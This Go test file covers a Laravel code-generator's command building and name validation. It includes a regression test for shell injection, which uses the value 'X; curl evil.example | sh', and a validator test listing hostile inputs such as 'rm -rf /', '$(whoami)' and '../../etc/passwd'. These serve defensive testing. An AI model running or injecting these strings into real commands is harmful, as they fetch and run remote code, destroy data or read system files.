package gen

import (
	"slices"
	"strings"
	"testing"
)

func TestCommand(t *testing.T) {
	ev, ok := ByKey("event")
	if !ok {
		t.Fatal("event component missing")
	}
	want := []string{"ddev", "exec", "php", "artisan", "make:event", "OrderPlaced"}
	if got := Command("ddev", ev, "OrderPlaced"); !slices.Equal(got, want) {
		t.Fatalf("event cmd = %q, want %q", got, want)
	}
	m, _ := ByKey("model")
	want = []string{"ddev", "exec", "php", "artisan", "make:model", "Order", "-mfs"}
	if got := Command("ddev", m, "Order"); !slices.Equal(got, want) {
		t.Fatalf("model cmd = %q, want %q", got, want)
	}
	// env threads through (sail instead of ddev)
	c, _ := ByKey("controller")
	want = []string{"sail", "exec", "php", "artisan", "make:controller", "OrderController"}
	if got := Command("sail", c, "OrderController"); !slices.Equal(got, want) {
		t.Fatalf("controller cmd = %q, want %q", got, want)
	}
	// A multi-word env prefix stays separate arguments.
	want = []string{"docker", "compose", "exec", "app", "exec", "php", "artisan", "make:event", "X"}
	if got := Command("docker compose exec app", ev, "X"); !slices.Equal(got, want) {
		t.Fatalf("multi-word env = %q, want %q", got, want)
	}
}

// TestCommandKeepsInjectionAsOneArgument is the regression test for command
// injection through a component name: the name used to be interpolated into a
// string run by `sh -c`, so `keel gen model 'X; curl evil|sh'` executed the tail.
// It is now a single argv element with no shell involved, and ValidateName
// refuses it before it gets that far.
func TestCommandKeepsInjectionAsOneArgument(t *testing.T) {
	m, _ := ByKey("model")
	evil := "X; curl evil.example | sh"
	got := Command("ddev", m, evil)
	if !slices.Contains(got, evil) {
		t.Fatalf("the name should survive as exactly one argument: %q", got)
	}
	for _, arg := range got {
		if strings.Contains(arg, "curl") && arg != evil {
			t.Fatalf("the name must not be split across arguments: %q", got)
		}
	}
}

func TestValidateName(t *testing.T) {
	for _, ok := range []string{"Order", "OrderPlaced", "create_users_table", "Admin/UserController", "_Leading", "A1"} {
		if err := ValidateName(ok); err != nil {
			t.Errorf("%q should be accepted: %v", ok, err)
		}
	}
	// Shell syntax, flags, traversal and spaces are all refused: these names end
	// up in a command's argv and in generated file paths.
	for _, bad := range []string{
		"", "X; curl evil|sh", "X && rm -rf /", "$(whoami)", "`id`",
		"../../etc/passwd", "..", ".", "a b", "-rf", "--force", "1Leading",
		"a/../b", `a\b`, "x\n y",
	} {
		if err := ValidateName(bad); err == nil {
			t.Errorf("%q should be refused", bad)
		}
	}
}

func TestByKeyMissing(t *testing.T) {
	if _, ok := ByKey("nope"); ok {
		t.Fatal("expected missing component")
	}
}
